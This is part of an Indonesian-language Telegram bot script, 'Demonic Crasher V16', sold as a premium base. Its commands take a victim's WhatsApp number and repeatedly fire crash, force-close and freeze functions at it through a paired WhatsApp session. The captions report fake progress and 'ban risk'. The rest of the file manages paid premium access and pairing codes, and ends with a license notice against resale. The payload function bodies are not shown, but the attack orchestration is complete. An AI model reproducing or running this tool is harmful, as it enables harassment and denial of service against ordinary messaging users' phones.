      if (isFixedBug(target)) {
        console.log(`[FIXEDBUG] Target dipause: ${target} (menunggu resume)`);
      }

      await waitIfFixedBug(target);

      console.log(`[SENT] Mengirim ke target: ${target} (loop ${i + 1})`);

      await Promise.allSettled([
        executions(sock, target),
        executions(sock, target),
      ]);

      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© Demonic Crasher V16 Gen 5`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("OverForce Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("OverPower", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /OverPower 62×××`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTargetWa(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 75%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V16 Gen 5`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© Demonic Crasher V16 Gen 5`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    // 💀 HARD STOP → DELETEBUG
      if (isDeletedBug(target)) {
        console.log(`[DELETEBUG] Target dihentikan total: ${target}`);
        break;
      }

      // 🧊 SOFT STOP → FIXEDBUG
      if (isFixedBug(target)) {
        console.log(`[FIXEDBUG] Target dipause: ${target} (menunggu resume)`);
      }

      await waitIfFixedBug(target);

      console.log(`[SENT] Mengirim ke target: ${target} (loop ${i + 1})`);
    
  await crashforclose(target);
  await sleep(600);
  
  // FORCE CLOSE 
  await executions(sock, target);
  await sleep(700);
}

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 75%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© Demonic Crasher V16 Gen 5`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("OverPower Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("GhostBlank", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /GhostBlank 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTargetWa(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V16 Gen 5`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© Demonic Crasher V16 Gen 5`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    // 💀 HARD STOP → DELETEBUG
      if (isDeletedBug(target)) {
        console.log(`[DELETEBUG] Target dihentikan total: ${target}`);
        break;
      }

      // 🧊 SOFT STOP → FIXEDBUG
      if (isFixedBug(target)) {
        console.log(`[FIXEDBUG] Target dipause: ${target} (menunggu resume)`);
      }

      await waitIfFixedBug(target);

      console.log(`[SENT] Mengirim ke target: ${target} (loop ${i + 1})`);
    
  await function1(sock, target);
  await sleep(600);

  await function7(sock, target);
  await sleep(700);
}

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Status: Successfully
▢ Progress: [██████████] 100%

© Demonic Crasher V16 Gen 5`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("GhostBlank Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("AppleBreak", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /AppleBreak 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTargetWa(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V16 Gen 5`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© Demonic Crasher V16 Gen 5`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    // 💀 HARD STOP → DELETEBUG
      if (isDeletedBug(target)) {
        console.log(`[DELETEBUG] Target dihentikan total: ${target}`);
        break;
      }

      // 🧊 SOFT STOP → FIXEDBUG
      if (isFixedBug(target)) {
        console.log(`[FIXEDBUG] Target dipause: ${target} (menunggu resume)`);
      }

      await waitIfFixedBug(target);

      console.log(`[SENT] Mengirim ke target: ${target} (loop ${i + 1})`);
    
      await Promise.allSettled([
        badzznedelay(target),
        badzznedelay(target),
        badzznedelay(target),
        badzznedelay(target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Status: Successfully
▢ Progress: [██████████] 100%

© Demonic Crasher V16 Gen 5`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("Andromin10 Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("CrashStrike", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /CrashStrike 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTargetWa(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V16 Gen 5`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© Demonic Crasher V16 Gen 5`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    // 💀 HARD STOP → DELETEBUG
      if (isDeletedBug(target)) {
        console.log(`[DELETEBUG] Target dihentikan total: ${target}`);
        break;
      }

      // 🧊 SOFT STOP → FIXEDBUG
      if (isFixedBug(target)) {
        console.log(`[FIXEDBUG] Target dipause: ${target} (menunggu resume)`);
      }

      await waitIfFixedBug(target);

      console.log(`[SENT] Mengirim ke target: ${target} (loop ${i + 1})`);
    
      await Promise.allSettled([
        YakuzaCrashNotif(target),
        YakuzaCrashNotif(target),
        YakuzaCrashNotif(target),
        YakuzaCrashNotif(target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© Demonic Crasher V16 Gen 5`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("CrashStrike Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("XredUi", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /XredUi 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTargetWa(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 50%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V16 Gen 5`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 50%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© Demonic Crasher V16 Gen 5`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    // 💀 HARD STOP → DELETEBUG
      if (isDeletedBug(target)) {
        console.log(`[DELETEBUG] Target dihentikan total: ${target}`);
        break;
      }

      // 🧊 SOFT STOP → FIXEDBUG
      if (isFixedBug(target)) {
        console.log(`[FIXEDBUG] Target dipause: ${target} (menunggu resume)`);
      }

      await waitIfFixedBug(target);

      console.log(`[SENT] Mengirim ke target: ${target} (loop ${i + 1})`);
    
      await Promise.allSettled([
        SystemUi(sock, target),
        SystemUi(sock, target),
        SystemUi(sock, target),
        SystemUi(sock, target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 50%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© Demonic Crasher V16 Gen 5`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("XredUi Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("iOS17Break", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /iOS17Break 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTargetWa(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V16 Gen 5`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© Demonic Crasher V16 Gen 5`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    // 💀 HARD STOP → DELETEBUG
      if (isDeletedBug(target)) {
        console.log(`[DELETEBUG] Target dihentikan total: ${target}`);
        break;
      }

      // 🧊 SOFT STOP → FIXEDBUG
      if (isFixedBug(target)) {
        console.log(`[FIXEDBUG] Target dipause: ${target} (menunggu resume)`);
      }

      await waitIfFixedBug(target);

      console.log(`[SENT] Mengirim ke target: ${target} (loop ${i + 1})`);
    
   // Delay 
  await delayfreeze(target);
  await sleep(700);
}

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© Demonic Crasher V16 Gen 5`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("iOS17Break Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
//setjedanya
bot.command("setcd", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  const duration = parseDuration(args);

  if (!duration) {
    return ctx.reply("❌ Contoh: /setcd 50s | /setcd 1 menit");
  }

  setGlobalDuration(duration);
  ctx.reply(`✅ Global cooldown diset ke ${args}`);
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addsvip", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ")

  if (args.length < 2) {
    return ctx.replyWithPhoto(khususImg, {
      caption: "❌ Format salah!\nExample: /addsvip 12345678"
    })
  }

  const userId = args[1]

  if (svipUsers.includes(userId)) {
    return ctx.replyWithPhoto(khususImg, {
      caption: `⭐ Bocah ${userId} sudah SVIP dari lahir 😎`
    })
  }

  svipUsers.push(userId)
  saveJSON(svipFile, svipUsers)

  return ctx.replyWithPhoto(khususImg, {
    caption: `👑 Selamat! ${userId} resmi jadi SVIP 🔥`
  })
});
bot.command("delsvip", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ")

  if (args.length < 2) {
    return ctx.replyWithPhoto(khususImg, {
      caption: "❌ Format salah!\nExample: /delsvip 12345678"
    })
  }

  const userId = args[1]

  if (!svipUsers.includes(userId)) {
    return ctx.replyWithPhoto(khususImg, {
      caption: `❌ ${userId} bukan SVIP bang 😹`
    })
  }

  svipUsers = svipUsers.filter(id => id !== userId)
  saveJSON(svipFile, svipUsers)

  return ctx.replyWithPhoto(khususImg, {
    caption: `💀 Status SVIP ${userId} dicabut. Turun kasta 😈`
  })
});
bot.command("addprem", checkSvip, (ctx) => {
  const args = ctx.message.text.trim().split(" ");
  if (args.length < 2) {
    return ctx.replyWithPhoto(khususImg, {
      caption: "❌ Format Salah! Example: /addprem 12345678",
    });
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.replyWithPhoto(khususImg, {
      caption: `✅ Kacung ${userId} Selamat Telah memiliki Akses Premium 🔱.`,
    });
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.replyWithPhoto(khususImg, {
    caption: `✅ Anak ${userId} sekarang adalah premium.`,
  });
});

bot.command("delprem", checkSvip, (ctx) => {
  const args = ctx.message.text.trim().split(" ");
  if (args.length < 2) {
    return ctx.replyWithPhoto(khususImg, {
      caption: "❌ Format Salah! Example: /delprem 12345678",
    });
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.replyWithPhoto(khususImg, {
      caption: `❌ Wkwkw ${userId} tidak ada dalam daftar premium 😹.`,
    });
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.replyWithPhoto(khususImg, {
    caption: `🚫 Mampus ${userId} telah dihapus dari akses premium.`,
  });
});

bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.replyWithPhoto(khususImg, {
      caption: `Anak Hewan Ini Sudah Title Premium Aja ✅.`,
    });
  } else {
    return ctx.replyWithPhoto(khususImg, {
      caption: `❌ Lawak bego lu bukan pengguna premium.\n💳 Klik tombol di bawah untuk beli akses!`,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💰 Hubungi Owner", url: "https://t.me/RozzyOfficial" }
          ]
        ]
      }
    });
  }
});
bot.action("copy_pairing_code", async (ctx) => {
  if (!global.lastPairingCode) {
    return ctx.answerCbQuery("❌ Kode sudah tidak tersedia", { show_alert: true });
  }

  const code = global.lastPairingCode;

  // Popup alert → langsung bisa tap & copy
  await ctx.answerCbQuery(`📋 Pairing Code:\n\n${code}`, {
    show_alert: true
  });

  // Kirim ulang dalam monospace → ada tombol copy Telegram
  await ctx.reply(
    `🔑 Pairing Code:\n\n<code>${code}</code>\n\n➡️ Tap kode di atas untuk menyalin`,
    { parse_mode: "HTML" }
  );
});
bot.command("reqpairing", checkOwner, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ")
    if (args.length < 2) {
      return ctx.reply("❌ Format salah\nContoh: /reqpairing 628xxxx")
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "")

    // ❌ kalau WA sudah connect, tolak pairing
    if (global.isWhatsAppConnected && global.sock?.user) {
      return ctx.reply(
        "───────────────\n" +
        "✅ WHATSAPP AKTIF\n" +
        "───────────────\n" +
        "📱 WhatsApp sudah connect\n" +
        "❌ Tidak perlu pairing\n" +
        " KETIK /delsesi UNTUK PAIRING\n" +
        "───────────────"
      )
    }

    // ❌ socket belum siap
    if (!global.sock) {
      return ctx.reply("⏳ Socket belum siap, tunggu sebentar lalu coba lagi")
    }

    // ❌ belum support pairing
    if (!global.sock.requestPairingCode) {
      return ctx.reply("❌ Socket belum support pairing code")
    }

    // 🔑 request pairing code
    const code = await global.sock.requestPairingCode(phoneNumber)
    const formattedCode = code.match(/.{1,4}/g).join("-")

    // simpan sementara buat tombol salin
    global.lastPairingCode = formattedCode

    await ctx.replyWithPhoto(khususImg, {
      caption:
        "───────────────\n" +
        "📲 WHATSAPP PAIRING\n" +
        "───────────────\n" +
        `📞 Nomor : ${phoneNumber}\n` +
        `🔑 Code  : ${formattedCode}\n` +
        "───────────────\n" +
        "📌 Klik tombol di bawah untuk salin kode\n" +
        "───────────────\n" +
        "👑 DEMONIC CRASHER",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📋 Salin Kode", callback_data: "copy_pairing_code" }]
        ]
      }
    })

  } catch (err) {
    console.error("PAIRING ERROR:", err)

    if (String(err).includes("rate-overlimit")) {
      return ctx.reply("⚠️ Terlalu sering request pairing, tunggu sebentar")
    }

    ctx.reply("❌ Gagal membuat pairing code")
  }
})
/////////// DEL SESION \\\\\\\\\
bot.command("delsesi", checkOwner, async (ctx) => {
  try {
    // 1. Logout & matikan socket kalau masih ada
    if (global.sock) {
      try {
        await global.sock.logout();
      } catch {}
      global.sock.ev?.removeAllListeners();
      global.sock = null;
    }

    // 2. Reset status
    isWhatsAppConnected = false;

    // 3. Hapus folder session
    const sessionPath = "./session";
    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
    }

    // 4. Info ke user dengan foto
    await ctx.replyWithPhoto(khususImg, {
      caption: "✅ Session berhasil dihapus\n🔄 Silahkan /reqpairing ulang untuk menggunakan command WhatsApp..."
    });

    // 5. Start ulang sesi WA
    setTimeout(() => {
      startSesi();
    }, 2000);

  } catch (err) {
    console.error("DELSESI ERROR:", err);
    await ctx.replyWithPhoto(khususImg, {
      caption: "❌ Gagal menghapus session"
    });
  }
});
////////// OWNER MENU \\\\\\\\\
bot.command("status", checkVerified, async (ctx) => {
  try {
    const sock = global.sock;

    if (!sock || !sock.user) {
      return ctx.replyWithPhoto(khususImg, {
        caption: "⚠️ WhatsApp belum terhubung.\nSilahkan jalankan /reqpairing untuk menghubungkan."
      });
    }

    if (sock.ws?.readyState !== 1) {
      return ctx.replyWithPhoto(khususImg, {
        caption: "⏳ WhatsApp sedang menghubungkan, tunggu beberapa detik..."
      });
    }

    const linkedWhatsAppNumber = sock.user?.id?.split(":")[0] || "-";

    return ctx.replyWithPhoto(khususImg, {
      caption: 
        `✅ WhatsApp Aktif\n` +
        `📱 Nomor: ${linkedWhatsAppNumber}\n` +
        `⏱ Uptime: ${getUptime()}`
    });
  } catch (err) {
    console.error("STATUS ERROR:", err);
    return ctx.replyWithPhoto(khususImg, {
      caption: "❌ Gagal mengambil status WhatsApp"
    });
  }
});

bot.command("listpairing", checkOwner, async (ctx) => {
  try {
    const sock = global.sock;

    if (!sock || !sock.user) {
      return ctx.replyWithPhoto(khususImg, {
        caption: "⚠️ WhatsApp belum terhubung.\nSilahkan jalankan /reqpairing untuk menghubungkan."
      });
    }

    const number = sock.user.id.split(":")[0];

    return ctx.replyWithPhoto(khususImg, {
      caption:
`📲 *PAIRING STATUS*

✅ WhatsApp Terhubung
📱 Nomor: ${number}
🖥 Mode: Multi-Device
🔐 Auth: Session Aktif

⚠️ Pastikan WhatsApp tetap terhubung untuk menggunakan semua fitur.

© Demonic Crasher V16 Gen 5`,
      parse_mode: "Markdown"
    });

  } catch (e) {
    return ctx.replyWithPhoto(khususImg, {
      caption: "❌ Gagal mengambil status pairing"
    });
  }
});
/////////////////END/////////////////////////
/////////////////FUNCTION/////////////////////////
// FUNCTION AMPAS LU 🗿
///////////////////[END FUNC LU WOI]////////////////
// ===== AKTIFKAN OWNER COMMAND =====
bot.use(owner);
// • • • • • JALANKAN BOT • • • • • \\
(async () => {
  try {
    console.log("🚀 Memulai sesi WhatsApp...");
    await startSesi();

    console.log("🤖 Menjalankan Telegram Bot...");
    await bot.launch({ dropPendingUpdates: true });

    console.log("✅ TELEGRAM ONLINE 😎");
  } catch (err) {
    console.error("❌ Gagal memulai bot:", err);
    process.exit(1);
  }
})();
/*
Hello Buyer Base Demonic Crasher By Rozzy Official
Notes : • Base ini Premium 🔱
• NO FREE KE ORANG LAIN
• NO SHARE PUBLIK
• NO JUAL ULANG
• NO JUAL + NO ENC
• BOLEH RENAME
• WAJIB JAGA CREDIT
• NO HAPUS CREATE BY ROZZY OFFICIAL

Base ini menggunakan VERSI TELEGRAM (TELEGRAF)
Dirancang khusus oleh Rozzy Official untuk membantu kalian dalam membuat Script Bot Telegram dengan sistem yang lebih rapi, aman, dan modern.
Base Demonic Crasher Version 15 Gen 1
Base ini berbeda dari base lainnya karena: • Menggunakan Sistem Tombol / Callback Next
(bukan 1 fitur = 1 tombol)

• Sudah dilengkapi Tools Menu
• Sistem Password & Verifikasi Password
• Bars / Progress System
• Bisa diatur START KHUSUS PREMIUM
• Support sistem keamanan lanjutan

🔐 Security Base
• Anti Bypass Easy
• Database Token
• Password Protection
• Verifikasi User

⭐ Sistem Premium
Base ini sudah mendukung FITUR PREMIUM, di antaranya: • Akses menu khusus Premium User
• Start bot bisa dikunci khusus premium
• Sistem verifikasi sebelum masuk menu premium
• Bisa dikembangkan menjadi jualan akses / subscription
• Cocok untuk bot private maupun commercial
CREATE BY ROZZY OFFICIAL
Telegram : @ROZZYOFFICIAL

⚠️ PERINGATAN
Jika ada yang menyebarkan base ini tanpa izin:
📩 Hubungi @RozzyOfficial
Akan diberikan imbalan / hadiah bagi yang melapor.

#Respect
#BuyerOnly
#NoShare
#DemonicCrasherV16
*/